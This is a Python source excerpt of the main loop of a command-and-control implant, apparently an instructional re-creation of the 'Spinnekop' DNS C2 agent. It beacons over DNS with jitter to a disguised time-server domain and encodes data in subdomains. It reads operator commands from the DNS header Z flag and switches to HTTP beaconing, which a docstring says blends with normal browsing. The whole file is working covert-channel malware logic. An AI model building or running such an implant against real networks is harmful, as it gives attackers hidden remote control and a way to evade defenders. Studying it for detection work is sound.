def run_agent(config: Optional[dict] = None) -> None:
    """
    Main agent loop.
    Mirrors Spinnekop cmd/agent/main.go but with all fixes applied.
    """
    cfg = config or AGENT_CONFIG
    ctx = AgentContext()
    dispatcher = ZDispatcher(cfg, ctx)

    # Determine resolver
    r_cfg = cfg.get("resolver", {})
    use_sys = r_cfg.get("use_system_defaults", False)
    r_ip    = r_cfg.get("ip", "127.0.0.1")
    r_port  = r_cfg.get("port", 53)

    if use_sys:
        r_ip, r_port = discover_system_resolver()
        print(f"[agent] Using system resolver: {r_ip}:{r_port}")
    else:
        print(f"[agent] Using resolver: {r_ip}:{r_port}")

    print(f"[agent] ID: {AGENT_ID}")
    print(f"[agent] Beacon interval: {DELAY_SEC}s ±{JITTER_PCT}%")
    print(f"[agent] Starting DNS beacon loop (Ctrl+C to stop)...\n")

    h_cfg = cfg.get("header", {})
    q_cfg = cfg.get("question", {})
    http_cfg = cfg.get("http", {})

    # ── Main DNS beacon loop ──────────────────────────────────
    while not ctx.shutdown_event.is_set():

        # Build query name (Z=2 uses encoded subdomain)
        sub = dispatcher.current_subdomain()
        base_name = q_cfg.get("name", "www.timeserversync.com.")
        if sub:
            # Strip leading "www." and prepend the encoded label
            bare = base_name.lstrip("www.")
            qname = f"{sub}.{bare}"
        else:
            qname = base_name

        # Build DNS packet
        try:
            pkt = bytearray(build_dns_query(
                qname       = qname,
                qtype       = q_cfg.get("type", "A"),
                qclass      = q_cfg.get("class", "IN"),
                transaction_id = h_cfg.get("id", 0),
                qr          = h_cfg.get("qr", False),
                opcode      = h_cfg.get("opcode", "QUERY"),
                aa          = h_cfg.get("authoritative", False),
                tc          = h_cfg.get("truncated", False),
                rd          = h_cfg.get("recursion_desired", True),
                ra          = h_cfg.get("recursion_available", False),
                z_value     = h_cfg.get("z", 0),
                rcode       = h_cfg.get("rcode", 0),
                std_class   = q_cfg.get("std_class", True),
                custom_class= q_cfg.get("custom_class", 1),
            ))
        except Exception as e:
            print(f"[agent] Packet build error: {e}")
            time.sleep(jittered_sleep_duration())
            continue

        visualize_packet(bytes(pkt), f"Beacon #{ctx.beacon_count + 1} → {qname}")

        # Send and receive
        try:
            resp_bytes = send_and_receive(bytes(pkt), r_ip, r_port)
        except socket.timeout:
            print(f"  [agent] No response (timeout)")
            resp_bytes = None
        except Exception as e:
            print(f"  [agent] Network error: {e}")
            resp_bytes = None

        z_value = 0
        if resp_bytes:
            # Display response
            visualize_packet(resp_bytes, "Response")

            # Parse for display
            parsed = parse_dns_packet(resp_bytes)
            answers = parsed.get("answers", [])
            if answers:
                for a in answers:
                    print(f"  [dns] {a.get('name','')} → {a.get('rdata','')} "
                          f"(TTL={a.get('ttl',0)})")

            # Extract Z-value
            if len(resp_bytes) >= 4:
                z_value = read_z_flag(resp_bytes)
                ctx.last_z_value   = z_value
                ctx.last_z_command = Z_COMMAND_MAP.get(z_value, "?")

            # Dispatch command
            dispatcher.dispatch(z_value)

        ctx.beacon_count += 1

        if ctx.shutdown_event.is_set():
            break

        # HTTP mode loop (Z=3 activated)
        if ctx.http_mode:
            _run_http_loop(ctx, http_cfg)
            break

        # Sleep with jitter
        duration = jittered_sleep_duration()

        # Z=1 may override sleep duration
        if z_value == 1:
            should_sleep, dur = handle_z_one()
            if should_sleep:
                print(f"\n  ⏰ Extended sleep: {dur/3600:.1f} hour(s)")
                duration = dur

        print(f"\n  💤 Sleeping {duration:.2f}s...")
        _interruptible_sleep(duration, ctx.shutdown_event)

    print("\n[agent] Beacon loop exited.")


def _run_http_loop(ctx: AgentContext, http_cfg: dict) -> None:
    """
    HTTP mode: periodic contact after Z=3 activation.
    Teaching point: HTTP traffic blends with normal web activity;
    harder to distinguish from legitimate browsing patterns.
    """
    url = ctx.http_url
    print(f"\n[agent] Entered HTTP mode — contacting {url}")
    while not ctx.shutdown_event.is_set():
        contact_http_server(url)
        duration = jittered_sleep_duration()
        print(f"  💤 HTTP mode: sleeping {duration:.2f}s...")
        _interruptible_sleep(duration, ctx.shutdown_event)
    print("[agent] HTTP loop exited.")


def _interruptible_sleep(duration: float, stop_event: threading.Event) -> None:
    """Sleep in small increments, checking stop_event each tick."""
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        time.sleep(min(0.5, end - time.time()))


